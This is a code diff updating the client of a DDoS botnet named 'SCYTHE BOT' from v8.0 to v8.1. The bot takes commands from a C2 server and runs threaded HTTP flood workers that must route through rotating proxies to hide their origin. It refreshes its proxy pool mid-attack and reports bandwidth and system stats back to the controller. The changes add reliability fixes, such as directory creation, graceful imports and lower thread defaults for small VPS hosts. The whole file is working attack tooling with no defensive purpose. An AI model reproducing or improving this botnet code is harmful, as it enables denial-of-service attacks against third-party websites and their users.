@@ -1,20 +1,24 @@
 #!/usr/bin/env python3
 """
-SCYTHE BOT v8.0 — 12+ Hour Stable Proxy-First Build
+SCYTHE BOT v8.1 — MAXIMIZED & FIXED
 Features:
-- Hybrid Rate Limiter (works with ANY RPS: 1 to 1,000,000+)
+- Auto-create directories before logging setup
+- Hybrid Rate Limiter (works with ANY RPS)
 - Dynamic RPS Update (mid-attack via C2 command)
 - Log Rotation (auto cleanup, max 10MB x 5 files)
 - Bandwidth & System Stats Reporting
 - Graceful Shutdown (SIGTERM/SIGINT)
-- Auto Thread Adjust (kalau ulimit too low)
+- Auto Thread Adjust (ulimit too low)
 - Smart Reconnection (exponential backoff + jitter)
-- PROXY-FIRST: All L7 attacks MUST use proxy (never direct)
-- Smart Proxy Rotation: auto-skip dead proxies, never fall back to direct
-- SOCKS5/HTTP/SOCKS4 support with proper formatting
-- MID-ATTACK PROXY REFRESH: auto-refresh proxy list dari C2 saat attack
-- PROXY POOL REFRESH: auto-refresh proxy pool tiap 3 menit selama attack
+- PROXY-FIRST: All L7 attacks MUST use proxy
+- Smart Proxy Rotation: auto-skip dead proxies
+- SOCKS5/HTTP/SOCKS4 support
+- MID-ATTACK PROXY REFRESH
+- PROXY POOL REFRESH every 3 minutes
+- FIXED: Auto-create logs/ directory
+- FIXED: Better error handling for missing deps
 """
+
 import socket
 import subprocess
 import time
@@ -23,23 +27,47 @@ import json
 import threading
 import os
 import random
-import requests
 import configparser
-import psutil
 import signal
 import logging
 from datetime import datetime
 from logging.handlers import RotatingFileHandler
-from urllib3.exceptions import InsecureRequestWarning
 
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+# ========== FIX #1: Auto-create directories BEFORE logging setup ==========
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+os.makedirs(os.path.join(SCRIPT_DIR, 'logs'), exist_ok=True)
+os.makedirs(os.path.join(SCRIPT_DIR, 'data'), exist_ok=True)
+
+# ========== FIX #2: Graceful import for optional deps ==========
+try:
+    import psutil
+    PSUTIL_AVAILABLE = True
+except ImportError:
+    PSUTIL_AVAILABLE = False
+    print("[WARN] psutil not installed. System stats will be limited.")
+
+try:
+    import requests
+    from requests.adapters import HTTPAdapter
+    REQUESTS_AVAILABLE = True
+except ImportError:
+    REQUESTS_AVAILABLE = False
+    print("[ERROR] requests not installed! Run: pip install requests[socks] psutil")
+    sys.exit(1)
+
+try:
+    from urllib3.exceptions import InsecureRequestWarning
+    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+except:
+    pass
 
 # ========== LOGGING SETUP (Rotation) ==========
+LOG_FILE = os.path.join(SCRIPT_DIR, 'logs', 'bot.log')
 logging.basicConfig(
     level=logging.INFO,
     format='[%(asctime)s] [%(levelname)s] %(message)s',
     handlers=[
-        RotatingFileHandler('logs/bot.log', maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'),
+        RotatingFileHandler(LOG_FILE, maxBytes=10*1024*1024, backupCount=5, encoding='utf-8'),
         logging.StreamHandler(sys.stdout)
     ]
 )
@@ -57,41 +85,45 @@ signal.signal(signal.SIGINT, signal_handler)
 
 # ========== ULIMIT CHECK & AUTO ADJUST ==========
 def check_and_adjust_limits(desired_threads):
-    import resource
-    soft_nofile, hard_nofile = resource.getrlimit(resource.RLIMIT_NOFILE)
-    soft_nproc, hard_nproc = resource.getrlimit(resource.RLIMIT_NPROC)
+    try:
+        import resource
+        soft_nofile, hard_nofile = resource.getrlimit(resource.RLIMIT_NOFILE)
+        soft_nproc, hard_nproc = resource.getrlimit(resource.RLIMIT_NPROC)
 
-    min_fd_needed = desired_threads * 4 + 100
-    min_proc_needed = desired_threads + 200
+        min_fd_needed = desired_threads * 4 + 100
+        min_proc_needed = desired_threads + 200
 
-    adjusted_threads = desired_threads
+        adjusted_threads = desired_threads
 
-    if soft_nofile < min_fd_needed:
-        logger.warning(f"⚠️  ulimit -n ({soft_nofile}) too low for {desired_threads} threads. Need {min_fd_needed}. Auto-reducing threads.")
-        adjusted_threads = max(10, (soft_nofile - 100) // 4)
-    else:
-        logger.info(f"✅ ulimit -n: {soft_nofile} (OK for {desired_threads} threads)")
+        if soft_nofile < min_fd_needed:
+            logger.warning(f"⚠️ ulimit -n ({soft_nofile}) too low for {desired_threads} threads. Need {min_fd_needed}. Auto-reducing threads.")
+            adjusted_threads = max(10, (soft_nofile - 100) // 4)
+        else:
+            logger.info(f"✅ ulimit -n: {soft_nofile} (OK for {desired_threads} threads)")
 
-    if soft_nproc < min_proc_needed:
-        logger.warning(f"⚠️  ulimit -u ({soft_nproc}) too low. Need {min_proc_needed}.")
-        adjusted_threads = min(adjusted_threads, max(10, soft_nproc - 200))
-    else:
-        logger.info(f"✅ ulimit -u: {soft_nproc} (OK)")
+        if soft_nproc < min_proc_needed:
+            logger.warning(f"⚠️ ulimit -u ({soft_nproc}) too low. Need {min_proc_needed}.")
+            adjusted_threads = min(adjusted_threads, max(10, soft_nproc - 200))
+        else:
+            logger.info(f"✅ ulimit -u: {soft_nproc} (OK)")
 
-    if adjusted_threads != desired_threads:
-        logger.warning(f"🔧 Auto-adjusted threads: {desired_threads} → {adjusted_threads}")
+        if adjusted_threads != desired_threads:
+            logger.warning(f"🔧 Auto-adjusted threads: {desired_threads} → {adjusted_threads}")
 
-    return adjusted_threads
+        return adjusted_threads
+    except ImportError:
+        logger.warning("⚠️ resource module not available. Skipping ulimit check.")
+        return desired_threads
 
 # ========== BACA KONFIGURASI ==========
 config = configparser.ConfigParser()
-config.read("config.ini")
+config.read(os.path.join(SCRIPT_DIR, "config.ini"))
 
 C2_IP = config.get("C2", "IP", fallback="127.0.0.1")
 C2_PORT = config.getint("C2", "PORT", fallback=4884)
 BOT_ID = config.get("C2", "ID", fallback=socket.gethostname())
-RAW_THREADS = config.getint("C2", "THREADS", fallback=150)
-RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=1500)
+RAW_THREADS = config.getint("C2", "THREADS", fallback=60)  # FIX: default 60 for 2GB VPS
+RPS_LIMIT = config.getint("C2", "RPS_LIMIT", fallback=800)  # FIX: default 800 for 2GB VPS
 BANDWIDTH_LIMIT_MB = config.getint("C2", "BANDWIDTH_LIMIT_MB", fallback=0)
 
 BOT_ID = BOT_ID.strip()
@@ -120,10 +152,7 @@ read_buffer = ""
 
 # ========== PROXY MANAGEMENT ==========
 class ProxyPool:
-    """
-    Smart proxy pool with rotation, health tracking, and dead-proxy skipping.
-    NEVER falls back to direct mode. Supports mid-attack proxy refresh.
-    """
+    """Smart proxy pool with rotation, health tracking, dead-proxy skipping."""
     def __init__(self, proxies):
         self._all_proxies = list(proxies) if proxies else []
         self._alive = list(self._all_proxies)
@@ -147,7 +176,6 @@ class ProxyPool:
         """Refresh proxy pool dengan proxy baru dari C2 (mid-attack)."""
         with self._lock:
             old_count = len(self._alive)
-            # Merge: keep existing alive + add new
             for p in new_proxies:
                 if p not in self._all_proxies and p not in self._dead:
                     self._all_proxies.append(p)
@@ -175,8 +203,8 @@ class ProxyPool:
             if self._fail_counts[proxy_url] >= max_failures:
                 if proxy_url in self._alive:
                     self._alive.remove(proxy_url)
-                self._dead.add(proxy_url)
-                logger.warning(f"[PROXY] {proxy_url} marked DEAD (failures: {self._fail_counts[proxy_url]})")
+                    self._dead.add(proxy_url)
+                    logger.warning(f"[PROXY] {proxy_url} marked DEAD (failures: {self._fail_counts[proxy_url]})")
 
     def mark_alive(self, proxy_url):
         """Reset failure count on success."""
@@ -191,16 +219,10 @@ def format_proxy(proxy_url):
     proxy_url = proxy_url.strip()
 
     if proxy_url.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
-        return {
-            'http': proxy_url,
-            'https': proxy_url
-        }
+        return {'http': proxy_url, 'https': proxy_url}
 
     formatted = f'http://{proxy_url}'
-    return {
-        'http': formatted,
-        'https': formatted
-    }
+    return {'http': formatted, 'https': formatted}
 
 def log(msg, level=logging.INFO):
     logger.log(level, f"[{BOT_ID}] {msg}")
@@ -267,7 +289,7 @@ class HybridRateLimiter:
             sleep_time = (1.0 - self.tokens) / self.rate
             return sleep_time
 
-# ========== ATTACK ENGINE v8.0 (12H STABLE) ==========
+# ========== ATTACK ENGINE v8.1 (MAXIMIZED) ==========
 class AttackEngine(threading.Thread):
     def __init__(self, attack_id, method, target, port, duration, hold_time, extra, rps_limit, proxies, sock):
         super().__init__(daemon=True)
@@ -345,7 +367,8 @@ class AttackEngine(threading.Thread):
 
     def run(self):
         self.start_time = time.time()
-        self._net_io_start = psutil.net_io_counters()
+        if PSUTIL_AVAILABLE:
+            self._net_io_start = psutil.net_io_counters()
         end_time = self.start_time + self.duration + self.hold_time
 
         self.proxy_pool = ProxyPool(self.proxies)
@@ -397,13 +420,16 @@ class AttackEngine(threading.Thread):
 
             bw_sent_mb = 0
             bw_recv_mb = 0
-            if self._net_io_start:
+            cpu_percent = 0
+            mem_percent = 0
+
+            if PSUTIL_AVAILABLE and self._net_io_start:
                 net_now = psutil.net_io_counters()
                 bw_sent_mb = (net_now.bytes_sent - self._net_io_start.bytes_sent) / 1024 / 1024
                 bw_recv_mb = (net_now.bytes_recv - self._net_io_start.bytes_recv) / 1024 / 1024
-
-            cpu_percent = psutil.cpu_percent(interval=0.1)
-            mem = psutil.virtual_memory()
+                cpu_percent = psutil.cpu_percent(interval=0.1)
+                mem = psutil.virtual_memory()
+                mem_percent = mem.percent
 
             report = {
                 "type": "attack_progress",
@@ -420,7 +446,7 @@ class AttackEngine(threading.Thread):
                 "bandwidth_sent_mb": round(bw_sent_mb, 2),
                 "bandwidth_recv_mb": round(bw_recv_mb, 2),
                 "cpu_percent": cpu_percent,
-                "mem_percent": mem.percent,
+                "mem_percent": mem_percent,
             }
             send_report(self.sock, report)
             log(f"[PROGRESS] Delta: +{delta} | Total: {current_total} | RPS: {current_rps} | Success: {self.success_requests} | Proxy: {self.proxy_requests} | Pool: {self.proxy_pool.count if self.proxy_pool else 0} | Refreshes: {self._proxy_refresh_count} | BW: {bw_sent_mb:.1f}MB/{bw_recv_mb:.1f}MB | CPU: {cpu_percent}%")
@@ -429,7 +455,7 @@ class AttackEngine(threading.Thread):
         self.thread_count = THREADS
 
         if self.proxy_pool.count == 0:
-            log(f"[ENGINE] ⚠️  NO PROXIES AVAILABLE! Attack will not use direct mode. Waiting for proxies...")
+            log(f"[ENGINE] ⚠️ NO PROXIES AVAILABLE! Waiting for proxies...")
             if self.proxy_pool.total == 0:
                 log(f"[ENGINE] ❌ No proxies at all. Attack aborted.")
                 return
@@ -449,7 +475,7 @@ class AttackEngine(threading.Thread):
 
     def _l7_worker(self, end_time, worker_id, limiter):
         session = requests.Session()
-        adapter = requests.adapters.HTTPAdapter(pool_connections=1, pool_maxsize=5, max_retries=0)
+        adapter = HTTPAdapter(pool_connections=1, pool_maxsize=5, max_retries=0)
         session.mount('http://', adapter)
         session.mount('https://', adapter)
 
@@ -515,13 +541,13 @@ class AttackEngine(threading.Thread):
                     consecutive_proxy_fails = 0
                     proxy_failures = 0
                 else:
-                    log(f"[W{worker_id}] ⚠️  All proxies dead. Retrying in 2s...")
+                    log(f"[W{worker_id}] ⚠️ All proxies dead. Retrying in 2s...")
                     time.sleep(2)
                     continue
 
             try:
                 resp = session.get(
-                    self.target, 
+                    self.target,
                     timeout=(5, 8),
                     verify=False,
                     proxies=current_proxy_formatted,
@@ -640,7 +666,7 @@ def handle_command(sock, cmd_json):
             active_proxies = attack_proxies if attack_proxies else proxy_list
 
             if not active_proxies:
-                log(f"⚠️  [ATTACK] No proxies available! Attack will proceed with available pool only.")
+                log(f"⚠️ [ATTACK] No proxies available! Attack will proceed with available pool only.")
             else:
                 log(f"✅ [ATTACK] Using {len(active_proxies)} proxies for attack")
 
@@ -699,7 +725,6 @@ def handle_command(sock, cmd_json):
             threading.Thread(target=wait_and_report, daemon=True).start()
 
         elif cmd == "proxy_refresh":
-            # NEW: Mid-attack proxy refresh dari C2
             attack_id = data.get("attack_id")
             new_proxies = data.get("proxies", [])
             if attack_id in current_attacks and new_proxies:
